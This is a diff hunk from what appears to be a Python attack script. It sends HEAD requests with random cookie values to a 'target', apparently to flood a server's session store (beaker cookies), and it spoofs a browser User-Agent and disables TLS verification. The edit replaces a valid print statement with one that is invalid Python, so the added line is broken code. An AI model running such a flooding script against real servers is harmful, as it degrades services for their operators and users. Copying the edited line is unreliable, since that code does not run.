@@ -14,7 +14,7 @@ from aiohttp import ClientSession
 cooookie = { str(sys.argv[2]): str(random.randrange(1,99999999999999999999999999999))}
 HEADERS = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Connection': 'Close'}
-print('Meeping target with beaker cookies:')
+print('Meeping target with' cooookie 'cookies:')
 async def fetch(url, session, cookies=cooookie, headers=HEADERS):
     async with session.head(url, verify_ssl=False) as response:
         print('.', end='', flush=True)
